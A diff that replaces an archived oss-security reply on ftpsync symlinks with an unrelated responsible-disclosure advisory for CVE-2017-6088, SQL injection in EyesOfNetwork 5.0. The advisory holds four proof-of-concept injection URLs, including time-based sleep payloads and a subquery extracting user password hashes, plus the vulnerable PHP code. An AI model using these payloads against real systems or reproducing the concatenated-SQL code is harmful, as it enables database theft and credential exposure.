@@ -1,30 +1,192 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/21/4
-Message-ID: <20171021113934.bk2kdbl66o6anpbr@perpetual.pseudorandom.co.uk>
-Date: Sat, 21 Oct 2017 12:39:34 +0100
-From: Simon McVittie <smcv@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/23/4
+Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
+Date: Thu, 23 Mar 2017 16:21:15 +0100
+From: Sydream Labs <labs@...dream.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-8805: Unsafe symlinks not filtered in Debian mirror script ftpsync
+Subject: [CVE-2017-6088] EON 5.0 Multiple SQL Injection
 Content-Type: text/plain; charset=utf-8
 
-On Fri, 20 Oct 2017 at 23:08:14 +0000, Robert Watson wrote:
-> Okay, so a script adds a symlink to /etc/shadow or something else
-> confidential. Unless they're root, what good does it do them? They can't
-> read it.
+# [CVE-2017-6088] EON 5.0 Multiple SQL Injection
 
-In that particular case, it would do an attacker no good. (Unless the
-web server that will be serving the mirrored content is running as root,
-but don't do that.)
+## Description
 
-However, there are plenty of files on a system that are readable by the
-web server, but should not be readable by random people on the Internet.
-If the same web server has password-protected directories (for example
-using Apache .htaccess/.htpasswd) then the files with their passwords
-usually need to be readable by the web server, but should not be served.
+EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
 
-/etc/passwd is another common example: it doesn't contain actual
-passwords since shadow passwords became widespread, but having a list
-of valid usernames available to the public would make life easier for
-an attacker, and should usually be avoided.
+## SQL injection (authenticated)
 
-    smcv
+The Eonweb code does not correctly filter arguments, allowing
+authenticated users to inject arbitrary SQL requests.
+
+**CVE ID**: CVE-2017-6088
+
+**Access Vector**: remote
+
+**Security Risk**: medium
+
+**Vulnerability**: CWE-89
+
+**CVSS Base Score**: 6.0
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L
+
+### Proof of Concept 1 (root privileges)
+
+The following HTTP request allows an attacker (connected as
+administrator) to dump the database contents using SQL injections inside
+either the `bp_name` or the `display` parameter. These requests are
+executed with MySQL root privileges.
+
+```
+https://eonweb.local/module/admin_bp/php/function_bp.php?action=list_process&bp_name=&display=%27or%271%27=%271
+
+https://eonweb.local/module/admin_bp/php/function_bp.php?action=list_process&bp_name=%27or%271%27=%271&display=1
+```
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 114:
+
+```
+function list_process($bp,$display,$bdd){
+    $sql = "select name from bp where is_define = 1 and name!='".$bp."'
+and priority = '" . $display . "'";
+    $req = $bdd->query($sql);
+    $process = $req->fetchall();
+
+    echo json_encode($process);
+}
+```
+
+### Proof of Concept 2
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `type` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ajax.php?queue=active&type=1%27+AND+(SELECT+sleep(5))+AND+%271%27=%271&owner=&filter=equipment&search=&ok=on&warning=on&critical=on&unknown=on&daterange=&time_period=&ack_time=
+```
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ajax.php` file, line 64:
+
+```
+if($_GET["type"] == 0){
+  $ged_where = "WHERE pkt_type_id!='0'";
+} else {
+  $ged_where = "WHERE pkt_type_id='".$_GET["type"]."'";
+}
+$gedsql_result1=sqlrequest($database_ged,"SELECT
+pkt_type_id,pkt_type_name FROM pkt_type $ged_where AND pkt_type_id<'100';");
+```
+
+### Proof of Concept 3
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `search` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ajax.php?queue=active&type=1&owner=&filter=equipment&search='+AND+(select+sleep(5))+AND+'1'='1&ok=on&warning=on&critical=on&unknown=on&daterange=&time_period=&ack_time=
+```
+
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 129.
+
+```
+if($search != ""){
+    $like = "";
+    if( substr($search, 0, 1) === '*' ){
+        $like .= "%";
+    }
+    $like .= trim($search, '*');
+    if ( substr($search, -1) === '*' ) {
+        $like .= "%";
+    }
+
+    $where_clause .= " AND $filter LIKE '$like'";
+}
+```
+
+
+### Proof of Concept 4
+
+The following HTTP request allows an attacker to dump the database
+contents using SQL injections inside the `equipment` parameter:
+
+```
+https://eonweb.local/module/monitoring_ged/ged_actions.php?action=advancedFilterSearch&filter=(select+user_passwd+from+eonweb.users+limit
+1)&queue=history
+```
+
+
+#### Vulnerable code
+
+The vulnerable code can be found inside the
+`module/monitoring_ged/ged_functions.php` file, line 493:
+
+```
+$gedsql_result1=sqlrequest($database_ged,"SELECT
+pkt_type_id,pkt_type_name FROM pkt_type WHERE pkt_type_id!='0' AND
+pkt_type_id<'100';");
+
+
+while($ged_type = mysqli_fetch_assoc($gedsql_result1)){
+    $sql = "SELECT DISTINCT $filter FROM
+".$ged_type["pkt_type_name"]."_queue_".$queue;
+
+    $results = sqlrequest($database_ged, $sql);
+    while($result = mysqli_fetch_array($results)){
+        if( !in_array($result[$filter], $datas) && $result[$filter] != "" ){
+            array_push($datas, $result[$filter]);
+        }
+    }
+}
+```
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/10/2016 : Initial discovery.
+* 09/10/2016 : Fisrt contact with vendor.
+* 23/10/2016 : Technical details sent to the security contact.
+* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
+* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
+* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
+repsonsible disclosure agreement.
+* 14/03/2017 : Public disclosure.
+
+Thank you to EON for the fast response.
+
+## Solution
+
+Update to version 5.1.
+
+## Affected versions
+
+* Version <= 5.0
+
+## Credits
+
+* Nicolas SERRA <n.serra@...dream.com>
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (848 bytes)
